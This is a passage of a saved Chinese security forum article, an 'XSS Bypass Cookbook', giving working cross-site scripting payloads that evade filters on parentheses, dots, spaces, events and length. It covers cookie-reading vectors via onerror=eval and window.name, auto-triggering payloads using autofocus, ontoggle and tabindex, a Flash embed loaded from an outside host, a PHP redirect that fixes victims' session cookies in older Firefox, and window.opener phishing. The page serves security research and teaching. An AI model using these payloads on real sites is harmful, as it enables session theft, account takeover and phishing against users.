class="mr10">图片:18.png</span></p></div></div></span><br></div><div align="left">6.利用&lt;svg&gt;标签,&lt;svg&gt;内部的标签和语句遵循的规定是直接继承自xml而不是html</div><div align="left"><span id="att_2052" class="f12"><span id="td_att2052" onmouseover="read.open(&#39;menu_att2052&#39;,&#39;td_att2052&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_8c774856e9e1891.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2052" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:19.png</span></p></div></div></span><br></div><br><div align="left">区别在于,&lt;svg&gt;内部的&lt;script&gt;标签中,可以允许一部分进制/编码后的字符(比如实体编码)</div><div align="left">这里绕过对括号的过滤,使用实体编码为例,&amp;#[十进制],&amp;#x[十六进制] 作为例子</div><div align="left">使用如下payload</div><div align="left">1"&gt;&lt;svg&gt;&lt;script&gt;alert%26%23x28;1%26%23x29&lt;/script&gt;&lt;/svg&gt;</div><div align="left">成功的进行了绕过</div><br><div align="left"><span id="att_2053" class="f12"><span id="td_att2053" onmouseover="read.open(&#39;menu_att2053&#39;,&#39;td_att2053&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_0b76481fbf4510f.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2053" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:20.png</span></p></div></div></span><br></div><div align="left">7.利用ES6模板字符串</div><div align="left">`${some string}` 使用反引号</div><div align="left">中间的some string会被当作表达式解析,简单的说就是你可以在这里使用变量</div><div align="left">当然,一个很明显的地方就是,如果只是过滤了某个特定的字符,完全可以用这种方式绕过</div><div align="left">举个简单的例子,如果过滤掉了1</div><div align="left">我们可以用 `${3-2}` 这种方式来表示1</div><div align="left">而且有一部分函数是支持不用括号传参,直接使用模板字符串作为参数的。</div><div align="left">比如prompt,我们这里用它来弹出1</div><div align="left">使用如下的payload</div><div align="left">x="onfocus=prompt`${3-2}`//</div><br><div align="left">可以成功的绕过</div><div align="left"><span id="att_2054" class="f12"><span id="td_att2054" onmouseover="read.open(&#39;menu_att2054&#39;,&#39;td_att2054&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_bb73809f7577481.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2054" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:21.png</span></p></div></div></span><br></div><div align="left"><b>#3.3 针对特定敏感关键字的绕过方法</b></div><div align="left"><br></div><div align="left">1.针对过滤了.符号</div><div align="left"><br></div><div align="left">使用with()方法可以设定对象的作用域</div><div align="left">也就是我原本要访问location.hash</div><div align="left">由于点号被过滤</div><div align="left">只需要使用with(location)hash即可</div><div align="left">构造payload如下</div><div align="left">1"onfocus=with(location)alert(hash)//#11</div><div align="left"><span id="att_2055" class="f12"><span id="td_att2055" onmouseover="read.open(&#39;menu_att2055&#39;,&#39;td_att2055&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_b4ac1256b54cead.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2055" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:22.png</span></p></div></div></span></div><br><div align="left"><br></div><div align="left">2.针对过滤了()号</div><div align="left"><br></div><div align="left">使用throw传递参数,配合 ES6模板字符串 `${some string}` </div><div align="left">具体的思路是,throw可以抛出一个异常(err)交给异常处理函数去处理</div><div align="left">但是如果它没有在try...catch结构中使用的话,就会引发一个uncaught 'err内容' 的异常</div><div align="left">也就是抛出的整个异常内容是 "uncaugh 'err内容'"</div><div align="left">比如这样</div><br><div align="left"><span id="att_2056" class="f12"><span id="td_att2056" onmouseover="read.open(&#39;menu_att2056&#39;,&#39;td_att2056&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_999561434483561.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2056" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:23.png</span></p></div></div></span><br></div><div align="left">所以,如果我们把异常处理函数绑定为eval</div><div align="left">eval实际收到的就是一个Uncaught=alert(document.cookie)的表达式</div><div align="left">它会自动执行这个表达式</div><div align="left">而throw本身接受参数的时候是可以接受模板字符串作为参数的</div><div align="left">所以构造如下payload</div><div align="left">1"onfocus=top.onerror=eval;throw`=alert\x28document.cookie\x29`//</div><div align="left">这里等号的目的就是使它成为一个合法的表达式</div><div align="left"><span id="att_2057" class="f12"><span id="td_att2057" onmouseover="read.open(&#39;menu_att2057&#39;,&#39;td_att2057&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_83977ef26159dc3.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2057" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:24.png</span></p></div></div></span><br></div><br><div align="left">成功的绕过</div><div align="left"><br></div><div align="left">3.过滤了空格</div><div align="left">在标签的名称和第一个属性之间 可以用 / 来代替空格</div><div align="left">&lt;img/src="#" /&gt;</div><div align="left">而在其他的某几个位置换行符也是可以起效的,具体我没有进行测试</div><div align="left">《web之困》上有一个讲解这个知识点的地方</div><div align="left">只是大概的举一个payload作为例子</div><div align="left">x=1"&gt;&lt;img/src=%23%0aonerror=alert(1)&gt;</div><div align="left">我们不使用双引号来闭合,但是通过%0a作为分隔符获得了一样的效果</div><br><div align="left"><span id="att_2058" class="f12"><span id="td_att2058" onmouseover="read.open(&#39;menu_att2058&#39;,&#39;td_att2058&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_0dcd368020cc2ca.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2058" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:25.png</span></p></div></div></span><br></div><div align="left"><b>#4 长度限制的bypass</b></div><div align="left"><br></div><div align="left">码由于笔者自身的能力有限,所以这里也只列举三个方法</div><div align="left"><br></div><div align="left"><b>4.1 window.name跨域</b></div><div align="left"><br></div><div align="left">使用iframe跨域的话,自身的payload长度就可以得到极大的缩短</div><div align="left">因为你唯一需要的就是执行window.name里的代码</div><div align="left">有在特定的场景下,window.name由于window是一个全局对象,可以直接省略window</div><div align="left">而是用name去访问我们的window.name</div><div align="left">而window.name能够承载的长度很大,足够我们绕过</div><div align="left">因此我们的只需要eval(name)就可以了</div><div align="left">使用如下payload</div><div align="left">&lt;iframe src="http://127.0.0.1/q.php?x=1%22onfocus=eval(window.name)//" name="alert(document.cookie)" width="100%" height="100%" /&gt;</div><div align="left">成功执行</div><br><div align="left"><span id="att_2059" class="f12"><span id="td_att2059" onmouseover="read.open(&#39;menu_att2059&#39;,&#39;td_att2059&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_509638c8a6847d4.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2059" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:26.png</span></p></div></div></span><br></div><div align="left"><b>4.2 jquery工厂函数</b></div><div align="left"><br></div><div align="left">jquery的工厂函数$()需要传入的是一个完整的html标签</div><div align="left">它会自动的构造起里面的标签,并且执行里面的代码</div><div align="left">如果我们使用了$(location.hash)就缩短了非常多的长度</div><div align="left">做一个小小的测试</div><div align="left">使用的payload是这样的</div><div align="left">&lt;iframe src="http://127.0.0.1/q.php?x=1%22onfocus=$(window.name)//" name="&lt;img src='#' onerror=alert(document.cookie) /&gt;" width="100%" height="100%" /&gt;</div><div align="left">也能够成功的执行了代码,而且进一步缩短了payload的长度</div><br><div align="left"><span id="att_2060" class="f12"><span id="td_att2060" onmouseover="read.open(&#39;menu_att2060&#39;,&#39;td_att2060&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_603be57aaad121f.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2060" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:27.png</span></p></div></div></span><br></div><div align="left"><b>4.3 使用短域名</b></div><div align="left"><br></div><div align="left">曾经wooyun上的一篇文章有提到过这个问题,在payload长度相同的情况下,谁的域名越短</div><div align="left">谁就拥有了先天的优势。</div><div align="left">比如一些物理单位符号,可以被合法的注册,而且会被自动解析到对应的英文域名</div><div align="left">包括之后出现的一些韩语域名,emoji域名,也许都可以用来缩短我们的payload长度</div><div align="left"><br></div><div align="left"><b>#5 构造无需交互的payload&amp;绕过事件过滤</b></div><div align="left"><br></div><div align="left">之所以单独的将这一问题单独列出来,是因为虽然很多时候我们确实证明了某个输出点有xss漏洞</div><div align="left">但一个需要用户交互较少的xss payload 才称得上足够有效</div><div align="left"><b>但是大多数时候,能够使用的事件都被过滤了</b></div><div align="left">因此,如果我们的payload还需要用户做大量的点击拖拽等操作(click jacking除外)</div><div align="left">那完全称不上足够有效</div><div align="left">当然最好就是无需交互,那么就让我们来看一看怎么构造出无需交互的payload</div><div align="left"><br></div><div align="left"><b>5.1 onerror/onload 事件</b></div><div align="left"><br></div><div align="left">两个事件是最容易触发,而且无需交互的</div><div align="left">比如如下的payload</div><div align="left">&lt;svg/onload=alert(1)&gt;</div><div align="left">&lt;img src="#" onerror=alert(1) /&gt;</div><div align="left">但是这两个事件太常见了,非常容易就遭到了过滤</div><div align="left">而且也有相当一部分标签不支持onerror等事件</div><div align="left"><br></div><div align="left"><b>5.2 onfocus与autofocus</b></div><div align="left"><br></div><div align="left">对于&lt;input&gt;等标签来说,onfocus事件使他们在获得焦点时</div><div align="left">而autofocus则会让他们自动获得焦点</div><div align="left">因此,很容易利用这个构造出如下的payload,使他们自动获得焦点并触发事件执行js</div><div align="left">1"%20autofocus%20onfocus=alert(1)//</div><div align="left">完整的html标签是这样的</div><div align="left">&lt;input value="1" autofocus onfocus=alert(1)// &gt;</div><br><div align="left">可以自动的触发我们的payload</div><div align="left"><span id="att_2061" class="f12"><span id="td_att2061" onmouseover="read.open(&#39;menu_att2061&#39;,&#39;td_att2061&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_b9e89187008c84f.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2061" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:28.png</span></p></div></div></span></div><div align="left"><b>那么如果我们的onfocus属性也被过滤掉了呢?</b></div><div align="left"><br></div><div align="left"><b>5.3 onblur与autofocus</b></div><div align="left"><br></div><div align="left">onblur是标签失去焦点时引发的事件,那么你可能就会问了</div><div align="left">这和我无需交互的payload有什么关系呢</div><div align="left">很简单,我们来看看怎么样让标签'自动'失去焦点</div><div align="left">(1)在稍早版本的chrome中</div><div align="left">我们构造如下payload</div><div align="left"><br></div><div align="left">x=1"&gt;&lt;input%20onblur=alert(1)%20autofocus&gt;&lt;input%20autofocus&gt;&lt;input%20autofocus&gt;</div><div align="left"><br></div><div align="left">有好几个标签来'竞争' autofocus的焦点,那么 只要我们的第一个带有onblur事件的input,在获得焦点后,又因为竞争而失去焦点的话,就可以触发这个payload了</div><div align="left"><br></div><div align="left">(2)在最新版本中</div><div align="left">由于上一个payload已经无法正常工作了,但是我们仍然能够通过</div><div align="left">x=1"&gt;&lt;input%20onblur=alert(1)%20autofocus&gt;</div><div align="left">来构造一个需要较少交互的xss向量</div><div align="left">用户只要随意点击窗口里的任意一个地方就会触发我们的payload</div><div align="left">但是非常多其他标签似乎无法触发onfocus,更不要说autofocus了</div><div align="left"><br></div><div align="left"><b>5.4 &lt;details&gt;标签的ontoggle事件</b></div><div align="left"><br></div><div align="left">如果大部分常见事件都被过滤掉了,我们仍然有办法来构造一个无需交互的xss向量</div><div align="left">这就是&lt;details&gt;标签的ontoggle属性,它会在自身的open属性不为空时触发</div><div align="left">构造如下payload</div><div align="left">x=1"&gt;&lt;details%20open%20ontoggle="alert(1)"&gt;</div><div align="left">在chrome最新版本中有效</div><br><div align="left"><span id="att_2062" class="f12"><span id="td_att2062" onmouseover="read.open(&#39;menu_att2062&#39;,&#39;td_att2062&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_526ee653b5bd6bc.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2062" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:29.png</span></p></div></div></span><br></div><div align="left"><br></div><div align="left"><b>5.5 flash-xss的自动触发</b></div><div align="left"><br></div><div align="left">在之前的chrome auditor bypass中,它似乎非常鸡肋</div><div align="left">但是在存储型xss和其他浏览器的场景下,用它可以构造非常有效的攻击向量</div><div align="left">payload构造如下</div><div align="left"><br></div><div align="left">x=1"&gt;&lt;embed+type="application/x-shockwave-flash"+allowscriptaccess=always+src=https://www.math1as.com/3."&gt;</div><div align="left"><span id="att_2063" class="f12"><span id="td_att2063" onmouseover="read.open(&#39;menu_att2063&#39;,&#39;td_att2063&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_38dfe1a506c2720.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2063" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:30.png</span></p></div></div></span><br></div><br><div align="left">最新版chrome/firefox均有效</div><div align="left"><br></div><div align="left"><b>5.6 任意标签的自动触发</b></div><div align="left"><br></div><div align="left">那么如何实现任意标签的自动触发这一目标呢</div><div align="left">这里只简单的讲一个技巧</div><div align="left">可以用任意脚本构造出无需交互的payload</div><div align="left">如我们所知,有很大一部分标签是"不响应"onfocus事件的</div><div align="left">你用鼠标移动上去,他没有任何的反应</div><div align="left">但事实上,真的如此么?</div><div align="left">我们试着给它添加一个tabindex属性</div><div align="left">然后为它设置id=1</div><div align="left">最后用location.hash来定位到id=1的锚点,就可以让他获得焦点</div><div align="left">这里我们用一个不存在于标准里的标签&lt;hero&gt;来测试</div><div align="left">构造如下payload</div><div align="left">x=1"&gt;&lt;hero%20id="1"%20tabindex="0"%20onfocus=alert(1)&gt;#1</div><div align="left">对应的标签是</div><div align="left">&lt;hero id="1" tabindex="0" onfocus=alert(1)&gt;</div><div align="left">于是,我们就获得了一个构造任意标签的自动触发payload的方法。</div><br><div align="left"><span id="att_2064" class="f12"><span id="td_att2064" onmouseover="read.open(&#39;menu_att2064&#39;,&#39;td_att2064&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_e0a8b51a5dca3ae.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2064" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:31.png</span></p></div></div></span><br></div><div align="left"><br></div><div align="left"><b>#6 CSP Bypass</b></div><div align="left"><br></div><div align="left">CSP(内容安全策略)也是目前现代浏览器越来越重要的一种限制XSS的手段</div><div align="left">关于如何对它进行绕过,具体参见我的文章《初探CSP Bypass 一些细节总结》</div><div align="left"><br></div><div align="left"><b>#7 XSS tricks</b></div><div align="left"><br></div><div align="left">虽然有时候我们不一定能够通过标签和脚本的写入来实现一个xss</div><div align="left">但是有时候一些奇思妙想也可以让我们简介的实现目标</div><div align="left"><br></div><div align="left"><b>7.1 firefox &lt;50.02跨域问题</b></div><div align="left"><br></div><div align="left">这个漏洞出现在firefox的如下版本</div><br><div align="left">可以产生一个固定会话漏洞</div><div align="left">在服务器上把/test urlrewrite到 /xss/ff.php</div><div align="left">在ff.php则用302将浏览器重定向到一个dataURL</div><div align="left">&lt;?php</div><div align="left">$key="hehe";</div><div align="left">$val="tester";</div><div align="left">header("Location: data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;circle r='100'&gt;&lt;/circle&gt;&lt;foreignObject&gt;&lt;html xmlns='http://www.w3.org/1999/xhtml'&gt;&lt;meta http-equiv='Set-Cookie' content='$key=$val'/&gt;&lt;/html&gt;&lt;/foreignObject&gt;&lt;/svg&gt;");</div><div align="left">?&gt;</div><div align="left"><span id="att_2065" class="f12"><span id="td_att2065" onmouseover="read.open(&#39;menu_att2065&#39;,&#39;td_att2065&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_8065643343a2944.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2065" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:32.png</span></p></div></div></span><br></div><div align="left">然后在受害者访问的网站里插入&lt;img src="//xss.com/test" /&gt;</div><div align="left">访问后受害者的cookie被设置为hehe=tester 产生了一个固定回话漏洞</div><br><div align="left">此时如果受害者尝试进行登陆,我们随后就可以用这个被认证了的cookie以用户身份使用其账号</div><div align="left">因为chrome不允许302跳转到base64链接(如图)</div><br><br><span id="att_2066" class="f12"><span id="td_att2066" onmouseover="read.open(&#39;menu_att2066&#39;,&#39;td_att2066&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_b835e63d93b6433.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2066" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:33.png</span></p></div></div></span><br><div align="left">所以只能在firefox下使用这个攻击手法</div><div align="left">而且大部分网站的富文本编辑器都允许插入一张图片</div><div align="left">因此危害还是比较大的。</div><div align="left"><br></div><div align="left"><b>7.2 利用 opener进行钓鱼</b></div><div align="left"><br></div><div align="left">在js中可以使用window.opener (也就是当前window的父窗体)来访问到打开本窗体的页面</div><div align="left">比如我的chrome有两个标签页,从a标签页打开了b,那么b就可以通过window.opener.location</div><div align="left">反过来控制a标签页的地址</div><div align="left">虽然很明显的,浏览器不允许其跳转到一个javascript地址,但是却可以跳转到一个dataURL</div><div align="left">因此我们可以伪造一个a标签页对应网站的登陆页面,让用户以为是自己掉线了</div><div align="left">从而实现钓鱼的功能。</div><div align="left"><br></div><div align="left"><br></div><div align="left"><b>#8 结语</b></div><div align="left"><br></div><div align="left">通过本文对XSS的各类应用场景进行探讨,以笔者有限的能力剖析了一些业务场景</div><div align="left">分析了一部分具体的xss payload和目前存在的主流绕过方法。</div><div align="left">希望能够通过这篇文章,起到抛砖引玉的效果。</div><div align="left"><br></div><div align="left"><b>#9 参考</b></div><div align="left">[1] <span style="color:#0000ff ">https://html5sec.org/xssauditor/bypasses-052016</span></div><div align="left">[2] <span style="color:#0000ff ">https://insert-script.blogspot.co.at/2016/12/firefox-svg-cross-domain-cookie.html</span></div>
+                    </div>
+
+		</div>
+<!--content_read-->
+                </td>
+            </tr>
+            <tr>
+                <td class="floot_bottom">
+		<div id="read_Att_tpc" class="mb10">
+<div class="imgList">
+	<ul class="cc one" style="display:" id="imgList_0_all">
+		<li id="att_2048">
+		<span id="att_pic_sub_2048" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_1de4698d5179274.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span>
+		<div class="pw_menu" style="position:absolute;display:none" id="att_pic_2048">
+		 <div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;">
+
+
+<p><span class="mr10">图片:15.png</span>
+</p>
+		 </div>
+		</div>
+		</li>
+	</ul>
+</div>
+		</div>
+<!--评分-->
+		<div id="mark_tpc" class="score cc mb10" style="display:">
+<div class="scoreTop">
+	<span class="b">本帖最近评分记录：</span>
+	<span class="mr10">
+		共 <span class="s2" id="pingNum_tpc">1</span> 条评分
+		<span class="s2 pd15">
+人民币 +700
+		</span>
+	</span>
+</div>
+<div class="scoreContent">
+              <div id="createpingbox_tpc"></div>
+	<table width="100%" style="table-layout:fixed;">
+		<tbody id="pingPage_tpc" style="">
+		<tr id="pingLogTr_41" class="vt" onmouseover="showPingDelLink(this, true)" onmouseout="showPingDelLink(this, false)">
+<th class="p_face">
+                                    	<div id="card_pingUserShow_41_1312476865608221" class="userCard"><img src="./XSS_Bypass_Cookbook_files/1312476865608221.jpg" width="33" height="33"></div>
+	<span id="pingUserShow_41"></span>
+</th>
+<td class="p_name"><a target="_blank" href="https://xianzhi.aliyun.com/forum/u.php?uid=1312476865608221">笑然</a></td>
+<td width="100">人民币 <span class="s2">+700</span></td>
+
+
+<td>-</td>
+<td width="90">前天 12:38</td>
+<td width="20">
+</td>
+		</tr>
+		</tbody>
+	</table>
+</div>
+<input id="pingPageNum_tpc" type="hidden" value="2">
+<script language="javascript">
+getObj('pingPageNum_tpc').value = 2;
+</script>
+<div class="p10 cc">
+	<a id="pingHide_tpc" href="javascript:void(0);" onclick="pingHideCtrl(&#39;tpc&#39;);">隐藏</a>
+</div>
+		</div>
+		<div id="w_tpc" class="c"></div>
+<!--评分结束-->
+<div class="userOper">
+
+
+</div>
+<div class="shareAll cc mb10">
+	<em>分享到</em>
+	<a href="javascript:void(0)" onclick="window.open(&#39;http://share.jianghu.taobao.com/share/addShare.htm?title=&#39;+encodeURIComponent(document.title.substring(0,76))+&#39;&amp;url=&#39;+encodeURIComponent(location.href)+&#39;&amp;content=&#39;,&#39;_blank&#39;,&#39;scrollbars=no,width=600,height=450,left=75,top=20,status=no,resizable=yes&#39;); void 0" title="淘江湖">淘江湖</a>
+	<a href="javascript:(function(){window.open(&#39;http://v.t.sina.com.cn/share/share.php?title=&#39;+encodeURIComponent(document.title)+&#39;&amp;url=&#39;+encodeURIComponent(location.href)+&#39;&amp;source=bookmark&#39;,&#39;_blank&#39;,&#39;width=450,height=400&#39;);})()" title="新浪微博" style="background-position:0 -20px;">新浪</a>
+	<a href="javascript:void(0)" onclick="window.open( &#39;http://v.t.qq.com/share/share.php?url=&#39;+encodeURIComponent(document.location)+&#39;&amp;appkey=&amp;site=&amp;title=&#39;+encodeURI(document.title),&#39;&#39;, &#39;width=700, height=680, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, location=yes, resizable=no, status=no&#39; );" title="QQ微博" style="background-position:0 -40px;">QQ微博</a>
+	<a href="javascript:void(0);" onclick="window.open(&#39;http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=&#39;+encodeURIComponent(document.location.href));return false;" title="QQ空间" style="background-position:0 -60px;">QQ空间</a>
+	<a href="javascript:d=document;t=d.selection?(d.selection.type!=&#39;None&#39;?d.selection.createRange().text:&#39;&#39;):(d.getSelection?d.getSelection():&#39;&#39;);void(kaixin=window.open(&#39;http://www.kaixin001.com/~repaste/repaste.php?&amp;rurl=&#39;+escape(d.location.href)+&#39;&amp;rtitle=&#39;+escape(d.title)+&#39;&amp;rcontent=&#39;+escape(d.title),&#39;kaixin&#39;));kaixin.focus();" title="开心" style="background-position:0 -80px;">开心</a>
+	<a href="javascript:void((function(s,d,e){if(/renren\.com/.test(d.location))return;var f=&#39;http://share.renren.com/share/buttonshare?link=&#39;,u=d.location,l=d.title,p=[e(u),&#39;&amp;title=&#39;,e(l)].join(&#39;&#39;);function%20a(){if(!window.open([f,p].join(&#39;&#39;),&#39;xnshare&#39;,[&#39;toolbar=0,status=0,resizable=1,width=626,height=436,left=&#39;,(s.width-626)/2,&#39;,top=&#39;,(s.height-436)/2].join(&#39;&#39;)))u.href=[f,p].join(&#39;&#39;);};if(/Firefox/.test(navigator.userAgent))setTimeout(a,0);else%20a();})(screen,document,encodeURIComponent));" title="人人" style="background-position:0 -100px;">人人</a>
+	<a href="javascript:void(function(){var d=document,e=encodeURIComponent,s1=window.getSelection,s2=d.getSelection,s3=d.selection,s=s1?s1():s2?s2():s3?s3.createRange().text:&#39;&#39;,r=&#39;http://www.douban.com/recommend/?url=&#39;+e(d.location.href)+&#39;&amp;title=&#39;+e(d.title)+&#39;&amp;sel=&#39;+e(s)+&#39;&amp;v=1&#39;,x=function(){if(!window.open(r,&#39;douban&#39;,&#39;toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330&#39;))location.href=r+&#39;&amp;r=1&#39;};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})()" title="豆瓣" style="background-position:0 -120px;">豆瓣</a>
+	<a onclick="(function(){var url = &#39;link=http://news.163.com/&amp;source=&#39;+ encodeURIComponent(&#39;网易新闻&#39;)+ &#39;&amp;info=&#39;+ encodeURIComponent(document.title) + &#39; &#39; + encodeURIComponent(document.location.href);window.open(&#39;http://t.163.com/article/user/checkLogin.do?&#39;+url+&#39;&amp;&#39;+new Date().getTime(),&#39;newwindow&#39;,&#39;height=330,width=550,top=&#39;+(screen.height-280)/2+&#39;,left=&#39;+(screen.width-550)/2+&#39;, toolbar=no, menubar=no, scrollbars=no,resizable=yes,location=no, status=no&#39;);})()" href="javascript:void(0);" title="网易微博" style="background-position:0 -140px;">网易微博</a>
+	<a href="javascript:void(0);" onclick="window.open(&#39;http://apps.hi.baidu.com/share/?title=&#39;+encodeURIComponent(document.title.substring(0,76))+&#39;&amp;url=&#39;+encodeURIComponent(location.href));return false;" title="百度空间" style="background-position:0 -180px;">百度</a>
+	<a href="javascript:void(0);" onclick="window.open(&#39;http://xianguo.com/service/submitfav/?link=&#39;+encodeURIComponent(location.href)+&#39;&amp;title=&#39;+encodeURIComponent(document.title));return false;" title="鲜果" style="background-position:0 -200px;">鲜果</a>
+	<a href="javascript:void(0);" onclick="window.open(&#39;http://bai.sohu.com/share/blank/add.do?link=&#39;+encodeURIComponent(location.href)+&#39;&amp;title=&#39;+encodeURIComponent(document.title));return false;" title="白社会" style="background-position:0 -220px;">白社会</a>
+	<a href="javascript:void(0);" onclick="window.open(&#39;http://space.feixin.10086.cn/api/share?title=&#39;+encodeURIComponent(document.title)+&#39;&amp;url=&#39;+encodeURIComponent(location.href));return false;" title="飞信" style="background-position:0 -240px;">飞信</a>
+</div>
+           <div class="mb20 cc post-oper">
+<div class="fl readbot">
+	<a class="r-reply" title="回复此楼" href="javascript:;" onclick="postreply(&#39;回 楼主(math1as) 的帖子&#39;);">回复</a>
+	<a class="r-quote" href="https://xianzhi.aliyun.com/forum/post.php?action=quote&amp;fid=4&amp;tid=536&amp;pid=tpc&amp;article=0&amp;page=1" onclick="return sendurl(this,4,&#39;&#39;,event)" id="quote_tpc" title="" rel="nofollow">引用</a>
+</div>
+<div class="fr">
+	<a onclick="sendmsg(&#39;https://xianzhi.aliyun.com/forum/pw_ajax.php?action=report&amp;type=topic&amp;tid=536&amp;pid=tpc&#39;,&#39;&#39;,this.id);" title="举报此帖" href="javascript:;" class="mr5">举报</a>
+</div>
+             </div>
